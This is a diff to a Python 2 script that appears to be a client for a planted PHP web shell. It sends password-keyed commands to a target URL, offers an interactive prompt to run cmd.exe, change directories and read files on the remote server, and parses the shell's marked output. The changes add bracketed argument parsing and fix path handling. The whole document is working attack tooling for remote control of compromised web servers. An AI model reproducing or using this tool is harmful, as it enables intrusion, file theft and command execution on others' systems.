@@ -7,6 +7,7 @@ import binascii
 import urllib2
 import optparse
 import string
+import re
 session_url='http://127.0.0.1/test.php'
 session_pwd='cmd'
 session_type='php'
@@ -475,12 +476,13 @@ def readfile(filename):
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
-    response = urllib2.urlopen(req,data)
+    #response = urllib2.urlopen(req,data)
     try:
+        response = urllib2.urlopen(req,data)
         content=response.read().decode(session_encoding).encode('utf-8')
-    except:
+    except Exception,e:
+        response = urllib2.urlopen(req,data)
         content=response.read()
-        #content=response.read().decode(session_encoding).encode('utf-8')
     #print 'content:',content
     num1=content.find('->|')+3
     num2=content.find('|<-')
@@ -568,14 +570,15 @@ def cmd(cmdbash="cmd.exe",command=""):
 def changdir(dir):
     global session_dir
     #print 'dir',dir
-    if dir=='..\\' or dir=='..' or dir=='dir ../':
-        num=session_dir.rfind('/')
-	if num==-1:
+    if dir=='..\\' or dir=='..' or dir=='../':
+	if session_dir.rfind('/')==-1 and session_dir.rfind('\\')==-1:
 	    session_dir=session_dir
+	elif session_dir.rfind("\\")!=-1:
+	    session_dir=session_dir[0:session_dir.rfind('\\')]
+	elif session_dir.rfind("/")!=-1:
+	    session_dir=session_dir[0:session_dir.rfind('/')]
 	else:
-	    session_dir=session_dir[0:num]
-            if session_dir=='':
-	        session_dir='/'
+	    session_dir='/'
     elif dir=='.' or dir=='./' or dir=='.\\':
         session_dir=session_dir
 
@@ -618,15 +621,34 @@ def connected():
 	print "webuser:",session_user
         print "webroot:",session_webroot
         while True:
-            action=raw_input(session_dir.decode(session_encoding).encode('utf-8')+"@input command>:").strip().split()
+	    action=[]
+            input_str=raw_input(session_dir.decode(session_encoding).encode('utf-8')+"@input command>:")
+	    
+            if input_str.find('[')!=-1 and input_str.find(']')!=-1:
+	        print input_str.split(' ',1)
+		action.append(input_str.split(' ',1)[0])
+                pattern=re.compile('\[.*?\]')
+		parm_list=pattern.findall(input_str)
+		for i in parm_list:
+		    action.append(i.lstrip('[').rstrip(']'))
+	    else:
+	        action=input_str.split()
+	        
+	        
 	    if len(action)==0:
 	        pass
+	    
 	    elif action[0]=='cd':
 	        if len(action)==1:
 		    print 'currendir:\033[;31m%s\033[1;m'%session_dir
 		    print 'webroot:\033[;31m%s\033[1;m'%session_webroot
 		elif action[1]=='webroot':
                     changdir(session_webroot)
+		#elif input_str.split(' ',1)[1].startswith('['):
+		    #path=input_str.split(' ',1)[1]
+		    #path=path.split('[')[1].split(']')[0]
+		    #path=action[1].decode('utf-8').encode(session_encoding)
+		    #changdir(path)
 		else:
 		    action[1]=action[1].decode('utf-8').encode(session_encoding)
 		    changdir(action[1])
@@ -638,7 +660,11 @@ def connected():
 		else:
 		    action[1]=action[1].decode('utf-8').encode(session_encoding)
 		    viewdir(action[1])
-            elif action[0]=='cat' and len(action)==2:
+            elif action[0]=='cat' and len(action)>1:
+		#if input_str.split(' ',1)[1].startswith('['):
+		    #path=input_str.split(' ',1)[1]
+		    #path=path.split('[')[1].split(']')[0]
+		    #action[1]=path
 		filename=action[1].decode('utf-8').encode(session_encoding)
 		if filename[0:1] in string.ascii_letters and filename[1:2]==':' or filename[0:1]=='/':
                     filename=filename
